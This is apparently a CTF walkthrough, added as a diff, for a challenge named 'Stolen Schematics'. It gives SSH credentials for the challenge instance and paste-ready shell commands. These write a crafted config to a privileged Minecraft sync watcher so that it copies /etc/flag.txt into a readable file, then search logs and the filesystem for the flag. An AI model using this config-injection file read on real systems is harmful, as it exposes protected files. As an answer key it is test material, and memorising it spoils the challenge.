@@ -1,0 +1,95 @@
+==============================================
+STOLEN SCHEMATICS - COPY-PASTE SOLUTION
+==============================================
+
+STEP 1: Get fresh instance port from CTF platform
+        Note the port number (changes each time)
+
+STEP 2: Open PowerShell and enter WSL/Connect via SSH
+-----------------------------------------------------
+
+# For WSL users (if you have WSL):
+wsl
+apk add openssh-client  # Only needed first time in docker-desktop
+ssh player@instance.ctf.tdho.st -p <PORT>
+
+# OR for Git Bash users:
+ssh player@instance.ctf.tdho.st -p <PORT>
+
+Password: reyalp
+
+
+STEP 3: Once connected, paste THIS COMPLETE BLOCK:
+---------------------------------------------------
+
+printf "talldwarf-sync-command=FILE-READ:/etc/flag.txt\ntalldwarf-remove-cmd-sync-restrictions__DEPRECATED__=true\ntalldwarf-sync-output=/opt/mc/.sync/sync.result\n" > /opt/mc/config/sync-request.conf && echo "[+] Exploit written, monitoring..." && for i in {1..60}; do if [ -r /opt/mc/.sync/sync.result ]; then echo ""; echo "==================== FLAG FOUND ===================="; cat /opt/mc/.sync/sync.result; echo "===================================================="; break; fi; [ $((i % 10)) -eq 0 ] && echo "[$i/60] Waiting for watcher to process..." && ls -la /opt/mc/.sync/ 2>/dev/null | grep -E "(result|sync)"; sleep 1; done && echo "" && echo "[*] If no flag above, trying alternatives:" && cat /opt/mc/logs/latest.log 2>/dev/null | tail -50 | grep -i "TDHT" && find /tmp /opt/mc -type f -readable 2>/dev/null | xargs grep -l "TDHT" 2>/dev/null | while read f; do echo "[+] Found in: $f"; cat "$f"; done
+
+
+WHAT THIS DOES:
+---------------
+1. Writes exploit config to /opt/mc/config/sync-request.conf
+2. Monitors /opt/mc/.sync/sync.result for 60 seconds
+3. Shows progress every 10 seconds
+4. Displays flag immediately when found
+5. If not found, checks alternative locations (logs, tmp files)
+
+
+IF STILL NO FLAG:
+-----------------
+
+Try manual checks:
+
+# Check sync.result directly
+cat /opt/mc/.sync/sync.result
+
+# Check if file exists but permission not set yet
+ls -la /opt/mc/.sync/
+
+# Check Minecraft logs
+cat /opt/mc/logs/latest.log | grep -i TDHT
+
+# Search everywhere
+find / -type f -readable 2>/dev/null | xargs grep -l "TDHT" 2>/dev/null
+
+
+ALTERNATIVE EXPLOIT FORMAT:
+---------------------------
+
+If the above doesn't work, try this simpler format:
+
+cat > /opt/mc/config/sync-request.conf << 'EOF'
+SYNC_ACTION=READ
+SYNC_TARGET=/etc/flag.txt
+SYNC_OUTPUT=/tmp/flag.txt
+EOF
+sleep 15
+cat /tmp/flag.txt
+
+
+EXPECTED FLAG FORMAT:
+---------------------
+TDHT{...}
+
+
+TROUBLESHOOTING:
+----------------
+
+Problem: "Permission denied" on sync.result
+Solution: Wait longer - chmod 644 hasn't executed yet
+
+Problem: sync-request.conf keeps disappearing
+Solution: GOOD! Watcher is processing it. Keep waiting.
+
+Problem: No flag after 60 seconds
+Solution: Check /opt/mc/logs/latest.log and /tmp directory
+
+Problem: Instance expired/connection refused
+Solution: Get new instance from CTF platform, note new port
+
+
+TIME LIMIT: 10 minutes per instance
+STAY CALM: The exploit is correct, just need to wait!
+
+Good luck! 🚀
+
+==============================================
